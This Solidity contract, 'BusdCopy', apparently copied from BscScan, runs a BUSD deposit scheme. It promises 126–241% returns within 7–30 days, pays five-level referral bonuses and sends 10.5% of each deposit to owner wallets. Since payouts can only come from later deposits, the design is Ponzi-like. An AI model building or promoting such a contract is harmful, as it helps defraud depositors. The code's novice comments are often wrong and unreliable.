/**
 *Submitted for verification at BscScan.com on 2022-01-13
*/

pragma solidity ^0.8.11;


interface IERC20 {
    //not beginning contract yet

    function totalSupply() external view returns (uint256);

    //total amount of cryptos in site?

    
    function balanceOf(address account) external view returns (uint256);

    //user's balance
    
    function transfer(address recipient, uint256 amount) external returns (bool);

    //transfer function but returns bool value
    
    function allowance(address owner, address spender) external view returns (uint256);


    
    function approve(address spender, uint256 amount) external returns (bool);

    //deposit amount being approved
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    //function to actually transfer

    event Transfer(address indexed from, address indexed to, uint256 value);

    //event for function of transfer
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
    //event for function of approved amount
library Address {
    
    function isContract(address account) internal view returns (bool) {
        
        //function to check if address is correct(bool)
        

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    //as long as value for deposit amount/wallet amount is >0 this returns true
    
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    //sets two conditions for verifying funds
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    //condition for verifying transfer?
    
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        
        
        
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        
        
        

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    //add function built in 

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    //sub function built in

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    //mult function built in

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}

    //div function built in


struct Tarif {
  uint8 life_days;
  uint8 percent;
}

//struct/object

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint40 time;
}

//struct/object

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[5] structure; 
}

//struct/object

contract BusdCopy {
	using SafeMath for uint256;
	using SafeMath for uint40;
    using SafeERC20 for IERC20;

    //must specify data types in solidy when importing packages?

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;

    //setting public variables thats seperate from persons struct
    
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000; 
	uint256 constant public CEO_FEE = 45;
	uint256 constant public DEV_FEE = 45;
    uint256 constant public MARK_FEE = 15;
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [80, 20, 10, 5 , 5]; 

    //variables for fees

    IERC20 public BUSD;

    //variable for crypto currency

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;
    
    //key,value

	address payable public ceoWallet;
	address payable public devWallet;
    address payable public markWallet;

    //payout address variables

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

    //event = interactions with wallet, setting variable to reference interactions with wallet

    //emit is specific type of event

        constructor(address payable ceoAddr, address payable devAddr, address payable markAddr) {
        require(!isContract(ceoAddr) && !isContract(devAddr) && !isContract(markAddr));
		ceoWallet = ceoAddr;
		devWallet = devAddr;
        markWallet = markAddr;

        //when deposit happens, require payment for these first

        uint8 tarifPercent = 126;
        for (uint8 tarifDuration = 7; tarifDuration <= 30; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 5;
        }

        //tarifduration = days, tarifpercent= multiplying factor for deposit
        //for loop parameters, start at day 7, end at day 30, 
        //depositamt[days]=depositamt(days,pecent)
        //tarifpercent+5
        //NOT COMPLETE

        //slider reference



        BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    //function to check if payout is greater than 0, if greater, record payout amount and add to dividends variable

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }



    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != ceoWallet) {
            if(players[_upline].deposits.length == 0) {
                _upline = ceoWallet;
            }
            //ensuring the middle address is in transaction?
            //address(0) = new contract is being deployed

            //if players address is null and address is not same as CEO wallet
                //nested loop: if players deposit is 0
                //upline = ceowallet?

            //if the players address's amount of deposits = 0
            //    then address is = ceowallet?

            players[_addr].upline = _upline;



            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline, uint256 amount) external {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(amount >= 5 ether, "Minimum deposit amount is 5 BUSD");

        //required conditions in order to run the function (minimum deposit)

        BUSD.safeTransferFrom(msg.sender, address(this), amount); //transfer function
        Player storage player = players[msg.sender]; // storing the address of the user to player struct 
        require(player.deposits.length < 100, "Max 100 deposits per address"); //maxes out number of deposit 

        uint256 ceo = amount.mul(CEO_FEE).div(PERCENT_DIVIDER); //amount being multipled into a percentage and setting amount to that variable
		uint256 dFee = amount.mul(DEV_FEE).div(PERCENT_DIVIDER);
        uint256 mFee = amount.mul(MARK_FEE).div(PERCENT_DIVIDER);
		BUSD.safeTransfer(ceoWallet, ceo);
		BUSD.safeTransfer(devWallet, dFee);
        BUSD.safeTransfer(markWallet, mFee);
		emit FeePayed(msg.sender, ceo.add(dFee)); //creating a log of the fees adding ceo fee and dev fee

        _setUpline(msg.sender, _upline, amount);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: amount,
            time: uint40(block.timestamp)
        }));

        //parameters being placed into struct
        //stack is last one in first one out-pancakes
        //queue first in first out- single file lines

        player.total_invested+= amount;
        invested+= amount;

        //just adding

        _refPayout(msg.sender, amount);

        //logging and deploying to blockchain?

        emit NewDeposit(msg.sender, amount, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        BUSD.safeTransfer(msg.sender, amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to.sub(from)) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }


    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

    //show function to show invested amount, withdrawn, and match bonus

    function invest(address to, uint256 amount) external payable {
      payable(to).transfer(msg.value);
      BUSD.safeTransferFrom(msg.sender, to, amount);
    }

    //function to send amount from deposit variable to invest variable

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}